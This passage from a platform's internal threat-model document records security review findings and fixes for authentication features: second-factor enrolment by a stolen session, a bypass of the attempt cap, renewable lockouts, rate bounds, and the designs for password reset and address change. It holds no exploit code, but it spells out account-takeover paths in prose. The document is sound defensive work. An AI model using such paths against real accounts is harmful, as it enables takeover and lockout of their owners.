  ways — a deleted gate, a brand-new undeclared method that binds a credential
  (discovered and named), a renamed repo field (correctly still green, because
  the anchor is the type), and a revert to the TOTP-only predicate. It found a
  genuine error in its own declaration table on its first run, and a name
  collision on its second (`EmailVerificationRepo` also has a `markVerified`),
  which is what drove the type anchoring.
- **[OWNER: M29]** *THE WORST FINDING IS PRE-EXISTING AND M16 IS WHAT MADE IT MATTER: a stolen
  session could ENROL ITS OWN SECOND FACTOR.* `POST /v1/auth/totp/enroll` had
  been `SessionGuard`-only since M2. `revokeUnverifiedTotp` spares a VERIFIED
  method while `findActiveTotp` takes the NEWEST one, so a caller holding
  nothing but a session could enrol a secret of their own, confirm it with a
  code they computed themselves, and step up — three ordinary requests, no
  guessing. Measured end to end against real Postgres, including the second
  half: the owner's own authenticator answered 401 afterwards, so it was a
  takeover AND a lockout, of every docs/01 §5 action and of §5.1's liveness
  proof. The repository had already seen the mechanism and read it as a
  test-seeding nuisance (CLAUDE.md 2026-08-06, on why the settlement e2e caches
  enrolment). M16 is what made it acute: it built an attempt cap whose entire
  premise is that step-up bounds a stolen credential, and widened `stepup` to
  two more audiences. **Closed** by gating enrolment on a fresh step-up WHEN A
  VERIFIED FACTOR ALREADY EXISTS. *Residual, and it cannot be closed here:* for
  an account that never enrolled a factor, a stolen session still buys the
  bootstrap — there is no proof to demand. Such an account had no second factor
  to defeat. **The second half of this residual is CLOSED by M17 PR2**: it used
  to read "and identity cannot warn the owner because M14 deliberately made it
  not a holder of the notifications SEND credential", which was true when
  written and is now false in the direction that matters. Identity holds an
  ACCOUNT-SECURITY send edge of its own (`NOTIFICATIONS_SECURITY_INTERNAL_TOKEN`,
  §6l) and still holds no estate-send credential, so it can tell an owner their
  credentials changed without gaining the power to ring "a death report was
  filed on your account". What remains unwarned is the enrolment bootstrap
  itself — that kind does not exist yet, and adding one is a decision about
  which account events are worth a mail rather than a capability question. *Second residual,
  recorded not fixed:* a legitimate re-enrolment silently retires the previous
  authenticator, because `findActiveTotp` takes the newest. "Add a device" and
  "replace a device" are different intentions and the platform offers one
  behaviour for both; it is behind step-up now, so only the owner can cause it.

- *THE ATTEMPT CAP WAS BYPASSABLE BY ONE ROUTE.* `POST /v1/auth/totp/verify`
  checks the SAME `mfa_methods` row and had no cap of any kind, and its failures
  are a kind the counter did not count. Measured: forty wrong codes, forty 401s,
  never a 429, counter still zero — after which the code the guessing found
  elevated at `stepup` on the first try, spending none of the five.
  `stepup.ts`'s own "one chokepoint covers both" was wrong by one route.
  **Closed** — the failure and success kinds are SETS, both routes pass one
  gate, and `test/rate-bounds.spec.ts` scans the service so a third
  checker of the secret arrives declared or turns red.

- *THE CAP WAS A RENEWABLE LOCKOUT AGAINST THE OWNER, which its own docstring
  claimed a rolling window avoided.* The count was keyed on the USER and every
  live session wrote into it, so five wrong codes from ONE credential — the
  30-day extension token on disk being the cheapest — refused every OTHER
  session of the account. Measured: the owner's untouched session got 429 where
  it should have got 401. The only thing that clears the window is a success,
  which is what the 429 prevents, so five denials each quarter-hour hold it
  there indefinitely: the sticky lock the file says it refused to build,
  re-armed on a timer, blocking vault open, document generation, export,
  beneficiary changes, deletion and §5.1's rescue path. **Closed** with two
  scopes — a per-session cap a stolen credential exhausts on itself, under an
  account-wide ceiling that stays the real bound on guessing. *Residual:* an
  attacker who can MINT sessions (i.e. holds the password) can still walk the
  account total to its ceiling. That is the bar the account cap exists for.

- *ONE IDN PAGE DISCLOSED THE WHOLE VAULT.* See §4 TB9 above; **closed**, and
  the page-level notice replaces the per-item claim.

- *A DOUBLED TRAILING DOT COLLAPSED TWO REGISTRANTS ONTO A BARE SUFFIX.*
  `normaliseHost` stripped ONE trailing dot and was called twice on different
  strings, so `publicSuffix`'s empty-label guard never fired: `bank.com..` and
  `evil.com..` both resolved to `com.` and `matchOrigin` answered `match`.
  `URL.hostname` preserves the doubled dot, so the input is reachable, though
  both sides must carry it. **Closed** by making normalisation idempotent — a
  function called twice must agree with itself.

- *KEY MATERIAL SURVIVED A FAILED UNLOCK.* `prepare()` runs before the second
  SRP leg, so a refused or malformed `srp/verify` returned with the AUK and the
  SRP private key still resident — and because the idle clock is armed only on
  SUCCESS, nothing was scheduled to collect them. Only an offscreen teardown
  would ever have taken them. **Closed**: every non-success exit drops them.

- *A REVOKED PAIRING KEPT THE SECRET KEY ON DISK.* `forgetSecretKey` had two
  callers — the explicit opt-out and the VOLUNTARY disconnect. The path an owner
  takes when they revoke a device they believe is compromised forgot the session
  and left half the key material behind, so the protective route was the weaker
  of the two. **Closed.**

- *SMALLER, ALL CLOSED:* a refused injection rendered as "no password field was
  found on this page", collapsing a control into an absence on the one signal
  that says the platform refused; the vault edge's credential precedence fell
  through to the cookie on a MALFORMED `Authorization` header, so "never looks
  at the cookie" held only for well-formed input; and two shipped docstrings
  still said the extension credential "reaches five vault routes" four PRs after
  PR4a made it seven.

- *THE ROUTE-AUDIENCE FENCE WAS NAME-KEYED.* It scanned source for the literal
  `@AllowSessionAudiences`, while both guards resolve `SESSION_AUDIENCE_METADATA`
  through `Reflector.getAllAndOverride` — so an aliased import or a raw
  `SetMetadata` widens a route and is matched by nothing. Only `vault` and
  `identity` have a second-layer spec reading real handler metadata; for the
  other seven services that scan is the whole enforcement. This is the shape the
  credential graph was fixed for twice (2026-07-28, 2026-08-07). **Closed** by
  additionally asserting the metadata key has exactly one route into it,
  mutation-tested with a real alias.

- *STATED, NOT FIXED — WHAT THIS REVIEW DID NOT DO.* Nothing in the review ran
  in a real browser: the extension's own claims rest on jsdom and the crypto on
  Node's WebCrypto. One of the two things it recorded as owed has since been
  MEASURED; the rest stands.

- *`activeTab` REVOCATION, MEASURED — Chrome 151.0.7922.110, macOS.* The review
  left this open, noting that the fill-time re-read makes the boundary hold
  either way but that the platform's actual behaviour was unmeasured here. It
  is measured now, with a scratch probe extension holding `activeTab` and
  `scripting` and NO host permissions, so the grant was the only thing in play.
  The grant was taken with a real OS-level keyboard invocation of the action —
  a programmatic `chrome.action.openPopup()` from the service worker opens the
  popup and does NOT grant, which the run's control caught before any result was
  believed.

  | navigation from `a.test:8899` | grant |
  | --- | --- |
  | same origin (`a.test:8899/three`) | **survives** — still injects |
  | different host (`b.test:8899`) | **revoked** |
  | same host, different port (`a.test:8900`) | **revoked** |
  | subdomain, same site (`sub.a.test:8899`) | **revoked** |

  So the grant is ORIGIN-scoped and any cross-origin navigation revokes it. Two
  consequences worth keeping. First, the pre-fix TOCTOU really was being held
  shut by the platform rather than by the extension's own logic, exactly as the
  review suspected — which is why re-reading the tab at the gesture was the
  right fix regardless: it makes the code's stated claim true instead of resting
  on undocumented behaviour nobody here had checked. Second, THE PLATFORM IS
  STRICTER THAN OUR OWN MATCHER: `matchOrigin` treats a subdomain as the same
  registrable domain and would fill there, while the grant does not survive the
  navigation to it. Nothing depends on that asymmetry, but it means a same-site
  redirect loses the grant, which is a refusal a user may see and which is
  correct.

  *Bounded, and stated as such:* one Chrome build, one platform, a probe
  extension rather than the shipped artifact, and a keyboard invocation rather
  than a toolbar click. Both are user invocations; if the two ever diverge, this
  measured the keyboard one.

- *`activeTab` discloses the active tab's URL to the extension.* That is the
  minimum origin matching can run on, and it is bounded by the permission itself:
  granted only when the user clicks the extension, revoked on navigation, and
  carrying no ability to run code (that is `scripting`, still absent). There is
  no standing view of browsing, and no history.

## 6k. Threat-model delta — M17 PR1, the abuse bounds (2026-08-12)

**Before this change the platform had exactly one rate limit, on the second
factor, and it was the only one in the product.** `POST /v1/auth/login` accepted
password guesses at whatever rate a caller could sustain, each costing one
Argon2id verification; `POST /v1/auth/register` accepted registrations at 64 MiB
of memory-hard work apiece, paid before it looked to see whether the address
existed. `recordLoginFailure` wrote a `login.failed` row on every failure and
**nothing has ever read one**. Four residuals in this document (§6a, §6b, §6g,
§6i) deferred to "identity's login rate limiting" as a standing follow-up. This
is that follow-up, for login and register only. **A third bound was added by
the M17 PR6 review** — `POST /v1/auth/password` verifies the current password
and this delta's own framing ("the routes that take a password from an
unauthenticated caller") is exactly why it was missed; see §6p.

**Two bounds, because one selector cannot see the whole surface.**

| | keyed on | where it lives | what it sees |
|---|---|---|---|
| account | `user_id` | `auth_events`, the M16 predicate | guessing against an account that EXISTS |
| address | email blind index | **in memory, per process** | everything else — unknown addresses, register probes |

The account half is blind to most of what needs bounding, and structurally so:
`recordLoginFailure(null, …)` writes a NULL user whenever the identifier does not
resolve, and register's duplicate path returns having written no row in either
direction. So an attacker spraying one password across many addresses, and every
register probe, produce nothing a user-keyed predicate can count. The
address-keyed half is therefore the PRIMARY bound and the account half is the
durable ceiling behind it.

**The blind index is deliberately NOT added to `auth_events`.** That table is
append-only (`REVOKE UPDATE, DELETE`) and carries no `dek_id`, so an
`email_bidx` column there would permanently and unshreddably record a
correlatable identifier for addresses belonging to NO ACCOUNT — people who never
registered, typed at a login box by somebody else, with no erasure path. It
would also invert M9's "no blind index, lookup by user id only" decision for the
delivery store, and the index it needs is a plain `CREATE INDEX` inside the
migrator's BEGIN/COMMIT, which `005_auth_events_index.sql` already records as
taking a SHARE lock that blocks INSERT on the authentication write path.

**LOGIN REFUSES WITH THE SAME 401 A WRONG PASSWORD GETS.** This is the
load-bearing decision. A 429 on login is an account-existence oracle however the
counter is keyed, because it is a state a caller reaches only by naming
something the platform counted: past the threshold a live address would answer
429 while an address with no account answers 401 forever. That is perfectly
reliable, timing-independent, and would defeat the `dummyVerify` equalization
`password.ts` calls mandatory — the control manufacturing the oracle it was
added to bound. Register does answer 429, and that is safe for the mirror-image
reason: its bound is keyed on the submitted address alone and counted whether or
not an account exists, so the refusal depends on nothing the caller does not
already know.

**Ordering is a control, not arrangement.** The address check runs BEFORE the
user lookup — safe because its answer is existence-independent, and it is the
only thing standing between an unauthenticated caller and Argon2id. The account
check runs AFTER the password verification, which looks wasteful and is the only
correct placement: checking it earlier would let an over-cap account answer fast
while an unknown address still paid a full hash, which is the timing oracle this
route burns a dummy verification to close. Both orderings are pinned by
`test/rate-bounds.spec.ts`, because both produce a working rate limiter and only
one closes the channel.

### Residuals, stated rather than implied

- **[OWNER: E1]** *The account bound has NO per-credential scope, so a sustained attack denies
  NEW logins for that account.* M16's escape from the renewable-lockout trap was
  a per-session scope; login has no credential at the point of failure, and no
  restructuring invents one. Anyone who knows an address can submit wrong
  passwords for it and hold the account at its ceiling for as long as they keep
  it up. **What bounds the harm is that the bound touches the login route only:**
  a session that already exists keeps working, keeps refreshing, and reaches
  every route in the product, because `findLiveByAccessHash` and
  `findLiveByRefreshHash` consult no counter. That is not the M16 situation,
  where the refusal blocked the one action that could clear the window and
  simultaneously blocked vault open, document generation, export, beneficiary
  changes, deletion and §5.1's liveness proof. Twenty per fifteen minutes is set
  so no legitimate user meets it, which makes reaching it a burst signal rather
  than a support ticket. Proven, not asserted:
  `test/login-bound.int.spec.ts` drives an attacker to the ceiling and shows the
  owner's live session and refresh token still resolving.
- **[OWNER: E1]** *The address bound is per PROCESS and evadable three ways.* It survives no
  restart, is not shared between replicas (so the effective limit is N × the cap
  across N of them), and its map is capacity-bounded, which means a caller can
  evict their own counter by spraying unrelated addresses until it turns over.
  Eviction fails OPEN deliberately: failing closed would let whoever fills the map
  deny logins to every user in the product, which is worse than the spraying it
  would be trying to stop. The account half is the durable ceiling precisely
  because this half is evadable.
- **[OWNER: E1]** *PER-IP LIMITING IS NOT SHIPPED AND §4 TB1 IS CORRECTED RATHER THAN SATISFIED.*
  That section has claimed "per-IP+per-account rate limits" as an existing
  control since the document was written. There is no client IP anywhere in
  identity — no `X-Forwarded-For` read, no `req.ip`, and `sessions.ip_ct` /
  `auth_events.ip_ct` are declared and written by nothing — and neither public
  edge forwards one. Per-IP limiting belongs at the WAF, which is blocked on the
  M5 cloud half (an AWS org and billing, not an engineering decision). §4 now
  marks the per-IP half as unbuilt instead of asserting it.
- **[OWNER: M26]** *`login.failed` rows remain unattributed on the unknown-address path.* The
  append-only ledger is evidence about accounts that exist, and is not — and
  cannot be — the counter for the rest. Pinned as a known property by an int
  case rather than left to be rediscovered.
- **[OWNER: M29]** *Registration's enumeration channel is a TIMING one and a bound does not close
  it.* The duplicate path returns early having done less work; the fix its own
  docstring names is a fixed-shape, fixed-time response, which is a separate
  change. What the bound closes is the cost, not the leak.
- **[OWNER: E1]** *The other unauthenticated routes are deliberately unbounded.* `POST
  /v1/auth/handoff/redeem` and `POST /v1/auth/extension/pairing/redeem` check a
  guessable secret with no attempt cap by construction — a wrong guess resolves
  no row, so there is nothing to attribute a count to, which is the shape M14's
  round-2 review found making a cap decorative. Their bound remains 160 bits of
  entropy, a short TTL and burn-on-attempt. `POST /v1/auth/refresh` and `POST
  /v1/auth/logout/refresh` are likewise unbounded; both resolve a 256-bit token
  or nothing.
- **[CLOSED: §6y]** *The authenticated routes that check a secret were NOT considered here, and
  one of them needed a bound.* This delta's list above enumerates only
  UNAUTHENTICATED routes, which is how `POST /v1/auth/password` — whose whole
  purpose is to defend against a stolen session — went unbounded until the PR6
  review measured it (§6p). The list is now: login, register, password change
  AND the address-change request are bounded — the last two share one
  `ACCOUNT_PASSWORD_BOUND`, because two budgets of five are a budget of ten to
  anyone willing to alternate (§6y); handoff/pairing redeem and the two refresh
  routes are deliberately not.
- **[OWNER: E1]** *The bounds are per-service-instance for the address half and per-account for
  the ledger half; neither is a global quota.* §4 TB1's "per-tenant load
  shedding" is unrelated infrastructure work and is not delivered here.

### What M17 PR1 closes that predates it

- **[OWNER: M27]** *§6a's SRP rate-limiting residual — still only in part, and NOT by this change.*
  M16 closed the step-up half transitively. Login now has its own bound, which is
  what §6a's sentence pointed at, but a caller holding a genuine step-up can
  still burn vault SRP handshakes. That half stays open and is tracked in §6a.
- *§6i's "no rate limiting on handoff minting" is UNCHANGED.* Minting is
  step-up gated and therefore already sits behind the M16 cap; the standing
  follow-up it named was login's, which is now delivered, so its cross-reference
  is corrected rather than its residual closed.
- **[OWNER: E1]** *§6g's redeem-route residual is UNCHANGED and is edge work.* A per-caller
  bound there needs a caller identity this platform does not have; the 160-bit
  code is the control.

## 6l. Threat-model delta — M17 PR2, the password change (2026-08-12)

**Identity has never had a route that changes a password.** Sixteen milestones of
authentication with no way to rotate the credential all of it rests on, and no
deferral written anywhere — every "password reset" string in these documents
refers to the VAULT password (Zone A, M6), which is a different credential under
a different key hierarchy.

**The gate is BOTH halves, and each covers what the other cannot.**

| presented | what it proves | what a thief lacking it cannot do |
|---|---|---|
| current password | knowledge of the secret being replaced | a stolen SESSION cannot lock the owner out |
| fresh step-up (where a factor exists) | possession of the account's factor | a stolen PASSWORD cannot be made permanent |

The step-up half is **conditional**, on `SecondFactorGate`'s existing predicate:
an account with no verified factor has nothing to prove, and an unconditional
gate would make its password unchangeable forever — the worst available answer
for exactly the users least protected. The step-up question is asked BEFORE the
password check, so the route is not a free password oracle and the refusal's
timing does not vary with whether the guess was right.

**THE OLD HASH IS NO LONGER KEPT** (identity migration 008). `users_versions`
captures a row image on every `users` UPDATE, and this is the first UPDATE
`password_hash` has ever had, so before this change every password change would
have written its predecessor's Argon2id verifier into a table this schema
REVOKEs UPDATE and DELETE on. The M6 vault precedent does **not** transfer as
stated — an old hash verifies a RETIRED password, not the current secret, and
nothing in the repo reads `users_versions` — but that comment's *justification*
does: it keeps full row images everywhere else because "the ciphertext in it is
readable with the same key as the live row", i.e. crypto-shredding reaches the
capture. `password_hash` is the ONE column in `users` for which that is false. A
row image that survives a crypto-shred must not contain a credential verifier.
`email_ct` and `dek_id` are deliberately kept: they *are* under the envelope, and
they carry the audit value the trigger exists for.

**Ordering is the control, again.** `CREATE OR REPLACE FUNCTION` only affects
future captures, so a redaction shipped one release after the first write leaves
verifiers nothing can retract. The migration and the route are the same commit.

**Identity gained a transaction and an actor.** It was the only service of the
nine with no `withTransaction` and no `set_config('app.actor_id')` — measured,
every row that trigger has written came back with a NULL actor. Both halves
matter here: the hash write and the session revocation commit together (a hash
without the revocation leaves every credential minted under the old password
live), and the capture now records who. Redaction is only defensible because
what survives is who and when.

**A password change revokes every OTHER session, and keeps the caller's.** That
session has just proved the current password and, where one exists, a fresh
factor — it is the one credential in the set demonstrably held by someone who
knows the secret being replaced. Signing the changer out too is defensible and
is rejected on the M6 rule: a password change that ends your session teaches
people not to change their password.

**A FIFTH NOTIFICATIONS EDGE** (`NOTIFICATIONS_SECURITY_INTERNAL_TOKEN`, holder
identity alone). A silent password change is unacceptable and undoing M14's
split is worse. Three options existed, not two:

- *add identity to the estate SEND edge* — **impossible as a narrow grant**:
  `SendSchema` is built per-ROUTE from `ESTATE_NOTIFICATION_KINDS`, so there is
  no mechanism anywhere to give one holder a subset. Identity would get all ten,
  including `settlement.case_opened` and every `emergency.*`.
- *widen the existing VERIFY edge*, whose holder is already identity alone —
  **declined on that edge's own recorded reasoning**. It was split from
  RECIPIENTS so that "the first future holder of a resend capability" would not
  inherit a power it should not have; a support tool or a BFF-side resend is
  exactly that holder, and it must not arrive carrying the ability to tell a user
  their password changed.
- *a fifth edge* — **taken**.

The kind is a SYSTEM kind and, within that, a member of a narrower
`ACCOUNT_SECURITY_KINDS`. Three send routes now have three disjoint
vocabularies, each schema built from its own list, so no holder of one credential
can fire another's. The body carries **no variables at all** — not even a
timestamp, though "changed at 14:02" would read better — because the moment this
wire carries one, a holder chooses part of what the user reads.

### Residuals, stated rather than implied

- **[OWNER: M21]** *The notice is best-effort and its failure is recorded, not retried.* The
  change commits first; a notification that cannot be delivered leaves
  `notified: failed` on the audit event (the M13 `ownerNotified` shape) for an
  operator to re-drive. Sending first would risk telling someone their password
  changed when it had not.
- **[ACCEPTED]** *An attacker who has BOTH the password and a fresh step-up can change it.* That
  is not a gap this route can close — it is the definition of holding the
  account — and what bounds it is the notice, the audit event, and the fact that
  every other session dies in the same transaction, so the owner's own client
  discovers it at once.
- **[ACCEPTED]** *A password change does not touch the VAULT.* The Zone A master key derives
  from the vault password and Secret Key under 2SKD, never from the account
  password. Nothing here re-keys, re-wraps or invalidates anything in Zone A,
  and no surface says otherwise (PR3 owes the same statement, more loudly,
  because a RESET is where a user is most likely to assume it).
- **[ACCEPTED]** *`auth_events` gains `password.changed` and `password.change_failed`, and
  deliberately NOT `stepup.granted`.* That literal is hardcoded in the
  owner-liveness interlock, so emitting it would silently void an open §5.1 death
  case as a side effect — a policy decision taken by accident and a capability
  handed to whoever completed the change.
- **[ACCEPTED]** *The route is account-audience only.* A vault or extension session cannot
  replace the credential that mints it; a leaked derived credential must not be
  able to chain itself into permanent control, which survives revoking the
  credential that did it.
- **[CLOSED: §6m]** *Still no reset.* A user who has FORGOTTEN their password cannot use this
  route, by construction — it requires the current one. That is PR3.

## 6m. Threat-model delta — M17 PR3, the password reset (2026-08-13)

**A user who has forgotten their password had no way back.** PR2 gave the
platform a password CHANGE, which requires the current password by
construction; this is the other half, and it is the most dangerous route the
milestone adds — an unauthenticated ceremony that replaces the credential
everything else rests on.

**It mints nothing.** Redemption sets the password and returns no tokens, no
session, no step-up; the user signs in afterwards with what they chose. That is
the answer to "does redeeming a reset code grant step-up?" made *structural*
rather than kept as a rule: there is nothing to grant it to. The M15 PR4 review
is why it matters — an unauthenticated redeem route that granted step-up let a
stolen 60-second handoff code reach `POST /v1/vault/reset`, which is gated on
step-up alone, and crypto-shred a Zone A vault. A reset code granting step-up
would be that primitive delivered by email to a code that lives thirty minutes.
`test/mint-paths.spec.ts` asserts the set of session-minting paths and proves the
reset absent from it.

**A fourth `recovery` audience would not have helped.**
`AllowSessionAudiences` unconditionally prepends `account` and identity binds no
service-wide list, so a completion route admitting `recovery` would *also* be
reachable by every ordinary account session — a
set-a-new-password-without-the-current-one route behind any stolen bearer.

### THE DECISION THAT MOST WEAKENS THIS: no second factor

**A reset requires the mailed code and nothing else, even for an account holding
a verified TOTP or passkey.** Taken deliberately, and the consequence is stated
plainly rather than softened:

> For an account with a verified second factor, control of the mailbox is
> control of the account. A verified second factor does **not** protect against
> mailbox compromise.

That is a real weakening of M16's investment in step-up, and it buys one thing:
nobody is ever permanently locked out. The alternative — requiring the factor —
would leave a user who forgot their password *and* lost their authenticator with
no self-service path and no operator remedy, because TB7 does not exist and
there are no recovery codes. What bounds the damage, and none of it is
speculative:

- **the vault is untouched.** Zone A's master key derives from the vault
  password and Secret Key under 2SKD, never from the account password. A reset
  re-keys, re-wraps and opens nothing there, and the mailed body says so in
  words, because the vault origin already tells users Estate cannot reset that
  password for them.
- **every session is revoked**, so the real owner is signed out and notices.
- **the owner is mailed** on completion, on the M17 PR2 account-security edge.
- the whole sequence is on the audit trail: requested, completed, and every
  refusal.

PR5 (the passkey surface) revisited this and RE-DECLINED it, for the reason
recorded in §6o: requiring a passkey at reset turns lost-passkey-plus-forgotten-
password into a permanent lockout with no recovery codes and no TB7. A
recovery-codes ceremony remains the change that could strengthen this without
that trade; until then it is the platform's weakest link on risk #1 and should
be read as such.

### The rest of the shape

- **[OWNER: M29]** **The request route is enumeration-safe by CONSTRUCTION, not by policy.** It
  answers `202` for every input and does the work off the response path — the
  mint-and-send is fired without being awaited — so an address with an account
  cannot answer measurably later than a stranger's. Register's own docstring
  records that timing residual as still open; this route avoids inheriting it,
  which matters more here because a hit tells an attacker where to point a
  mailbox compromise.
- **Two bounds, and the per-address one is primary.** The per-account re-issue
  floor (30 min) can only be evaluated once an address resolves to a user, so it
  sees nothing at all for an address with no account — most of what an abuser
  sends. The per-address bound (10 per 15 min, in memory, per process) refuses
  before any lookup. Its refusal is SILENT, because the route tells a caller
  nothing either way.
- **The status allowlist rides the UPDATE.** `deceased_pending` is permitted
  (§5.1's rescue path is the living owner signing back in); `settlement` is
  refused, so whoever controls a decedent's mailbox cannot recover a terminally
  locked account.
- **Its own ledger kinds, never `stepup.granted`** — that literal is the
  owner-liveness interlock, so emitting it would silently void an open §5.1
  death case and hand that capability to whoever reads the mailbox.
- **A sixth notifications edge** (`NOTIFICATIONS_RECOVERY_INTERNAL_TOKEN`,
  identity alone). Not the VERIFY edge despite the identical holder and a
  near-identical payload: a verification code proves a mailbox and is redeemed
  by somebody already signed in, while a reset code is redeemed with no session
  at all. Four send routes now build from four closed kind lists, so no holder
  of one can fire another's.
- **Atomicity is the control.** Spending the code, writing the hash and revoking
  the sessions are one transaction: a spend without the write burns the user's
  only recovery code, and a write without the spend leaves the code replayable
  by whoever read that mailbox.

### Residuals

- **[ACCEPTED]** *The reset does not clear PR1's login bound.* A user locked out of NEW logins
  by a sustained wrong-password attack can reset successfully and still be
  refused at login until that window lapses (15 minutes). Emitting a
  `login.succeeded` to clear it would be a lie in the ledger, and the window is
  short enough that waiting is the honest remedy.
- **[CLOSED: §6w]** *There is no reset SURFACE.* PR3 ships the routes; no BFF resolver and no
  screen call them, so this is a zero-callers gap of exactly the kind this repo
  keeps closing — recorded here rather than discovered later. The same is true
  of PR2's change route. **CLOSED**: the change route by M20 PR1 (§6u), the
  address change by M20 PR2 (§6v), the reset by M20 PR3 (§6w).
- **[OWNER: E1]** *An unauthenticated route now causes mail.* §6h refused to fire a notification
  kind at registration for that reason, and PR1 narrowed only half of that
  refusal. The deviation is argued rather than inherited: the bound above is
  per-process and best-effort, so what actually keeps this route from being a
  mail-bomb primitive is the per-account floor of one code per thirty minutes,
  which applies to the address being mailed rather than to the caller.
- **[OWNER: E1]** *No attempt cap on redemption*, deliberately: the redeemer is unauthenticated
  and a wrong guess resolves no row, so a counter keyed on a resolved row would
  be the decorative cap the M14 round-2 review found. The bound is 160 bits, a
  30-minute TTL, and burn-on-attempt.
- **[CLOSED: §6n]** *The address-change lockout §6h records is NOT closed by this.* A reset mails
  to the address already on file, so for a user who mistyped their address at
  registration it changes nothing. CLOSED by PR4 — see §6n.

**Proven live, and one defect the whole suite passed over.** Driven end to end
against the running stack: a request answers 202 for an address with an account
and for one without, a real SES message carries the `PR1-…` code, the code
RETYPED THE WAY A HUMAN RETYPES IT (lowercase, grouping dashes dropped) is
accepted, the old password stops working, the session held before the reset
answers 401, a replay is refused, and `notification_sends` records the send
while `password_resets` holds a 32-byte digest that does not contain the code.
Every refusal — wrong code, mis-shaped code, replay — is one `invalid_code` on
the wire AND `{}` detail with a null actor in the audit trail, so the trail
does not re-create the oracle the uniform answer removes. The owner is told
their password changed by PR2's account-security notice, which fires on the
reset path too.

The first drive found that the ceremony COULD NOT COMPLETE. `sendPasswordReset`
emitted `{userId, code}` at a route whose `RecoverySchema` is `.strict()` and
requires `kind`, so every send answered 400 — and because identity retires a
code whose send fails, the code was minted, mailed nowhere and revoked. The
whole PR was inert in production while 27 tests passed over it, because the wire
body is declared TWICE and each side's suite validated its own declaration: the
client spec asserted method, URL and credential but never the body, and its own
fixture used a code the pattern rejects; the service specs built valid payloads
by hand. Nothing put one side's OUTPUT into the other side's PARSER. Closed by
`apps/services/notifications/test/wire-parity.spec.ts`, which drives the real
client over a recording transport and parses each emitted body with the schema
its route really uses — derived from the client prototype in one direction and
from the controller source in the other, so an added method or a renamed path
turns it red.

## 6n. Threat-model delta — M17 PR4, the address change (2026-08-13)

**What shipped.** The first way to change a sign-in address in the product's
history: `POST /v1/auth/email/change/request` (stage + mail a challenge),
`POST /v1/auth/email/change` (redeem + switch), `DELETE /v1/auth/email/change`
(withdraw, ungated — the M6 asymmetry). Ten identity routes existed for
credentials and none touched the address; §6h recorded the consequence as a
permanent lockout for anyone who mistyped at registration.

**VERIFY-THEN-SWITCH, and the ordering is the whole design.** Login resolves
users by `email_bidx`, so a change that stored an unproven address would lock
its owner out of LOGIN ITSELF — a typo'd new address must never reach `users`
until a code mailed to it comes back. Consequences, each structural rather than
procedural:

- The old address — login, notifications, everything — keeps working until the
  proof lands. An abandoned or mistyped change costs nothing.
- The M14 forward commitment ("clear `verified_at` in the same statement") is
  discharged one step STRONGER than it asked: no unproven address ever reaches
  the delivery store, so the bit is never cleared — the store's new
  `replace` statement swaps the address and stamps the proof together, and
  there is no moment when the store vouches for an address nobody proved.
- The staged address is encrypted at request time as `users.email` under the
  account's live DEK, so the switch moves CIPHERTEXT — no decrypt inside the
  transaction, and a key rotated or shredded mid-ceremony refuses the switch
  via a `dek_id` predicate restated inside the UPDATE itself.

**The gate is PR2's, verbatim, with §6m's own sentence as the reason:** control
of the mailbox is control of the account, so choosing the mailbox IS choosing
the account's owner of last resort. Current password (a stolen session lacks
it) + conditional step-up (a stolen password lacks it), factor asked FIRST so
the route is not a free password oracle.

**The seventh notifications edge** (`NOTIFICATIONS_EMAIL_CHANGE_INTERNAL_TOKEN`,
holder identity alone) exists because the challenge is INEXPRESSIBLE on every
prior wire: every other send resolves its destination from the encrypted
recipient store by user id, and this ceremony is by definition a challenge to a
mailbox the store does not hold. The edge's grant owns the deviation plainly —
it is the ONE send whose payload names a destination. What bounds it: the body
is doctrine-clean (the code and fixed words, no links, the uniform subject),
the notifications service uses the address for one delivery and STORES NOTHING
(no recipient row is created, read or touched — pinned by an int case), and
the code it mails completes nothing without the account's current password and
a fresh second factor. Widening VERIFY instead was rejected because its
recorded grant — "can only mail a code to whatever address is already on
file" — is precisely the property a future resend-tool holder must keep
inheriting.

**What completion sweeps, in ONE transaction with the switch:** outstanding
password-reset and address-verification codes (both were mailed to the mailbox
being left; a `PR1-` code that outlived the address it was mailed to would hand
whoever reads the OLD mailbox the account the owner just moved away from —
§6m's obligation, discharged), and every session but the caller's (the PR2
posture: the attacker's sessions and the owner's other devices cannot be told
apart).

**The old-address notice is an ORDERING property, not a wire property.** After
the switch commits, identity sends `identity.email_changed` (account-security
wire, carries nothing) BEFORE replacing the recipient — so the store still
resolves the address being LEFT, and the notice reaches the only mailbox whose
reader can dispute a takeover. The copy does not offer "sign in" as the remedy,
because after the change that reader structurally cannot: login uses the new
address. Detection is the notice; response is support. Get the ordering
backwards and the takeover notice goes to the attacker's mailbox — an int case
asserts the sequence.

**Anti-enumeration, register's own posture.** "Is this address registered" is a
fact about somebody else's account, so a taken address is a mail that never
arrives behind a uniform 202 — and because the work differs (KMS, inserts, a
carrier hand-off), the availability lookup and everything after it run DETACHED
from the response, pinned at the source (a runtime test cannot tell a fast
await from no await). Redemption's refusals are one `invalid_code` for every
dead reason — including the candidate address having been registered by someone
else during the 30-minute window, where "taken" would leak the other account
(that refusal burns no attempt: the code was right, the world changed).

**Bounds.** Per-account floor of five minutes between mints (M14's number —
the caller is authenticated and has proved password + factor), keyed on the
LAST MINT so a failing carrier cannot evaluate the floor away; a per-process,
per-DESTINATION bound (10/15min, the reset bound's numbers) because every
request may name a different target and the floor cannot see per-mailbox
volume; a per-user attempt cap of five on redemption, attributable BY DESIGN
(the selector is the authenticated caller, so a wrong guess of any shape burns
one attempt on their own live change — the M14 round-2 mechanic designed in
rather than retrofitted); one live change per user via a partial unique index,
retired UNCONDITIONALLY before every mint (the M14-review wedge).

### Residuals

- **[ACCEPTED]** *A stale login re-feed can transiently repoint the store to the just-left
  address.* Login (old address) resolves before the switch commits; its
  fire-and-forget recipient upsert lands after the switch's replacement; the
  store then holds the old address until the next login. Self-healing (the next
  login can only carry the NEW address — the old bidx no longer resolves) and
  not attacker-steerable without the owner's own credentials mid-race. The
  upsert's preserved bit stays sound through this: every address that can
  reach the store is either one the user just signed in with or one the
  ceremony just proved.
- **[ACCEPTED]** *An honest user typing a TAKEN address waits for a mail that never comes.*
  The cost of register's uniform answer, paid here too; the floor is not burned
  for it, so retrying with a corrected address is free.
- **[CLOSED: §6v]** ~~*The routes ship with no surface* — no BFF resolver, no screen.~~
  **CLOSED by M20 PR2 (§6v)**: all three legs now have a product consumer end
  to end, on the M14 PR3 settings page exactly as this line predicted.
- **[OWNER: M21]** *`identity.email_changed`'s reader has no self-service response.* The notice
  reaches the old mailbox, but a hijacked owner cannot sign in (the address
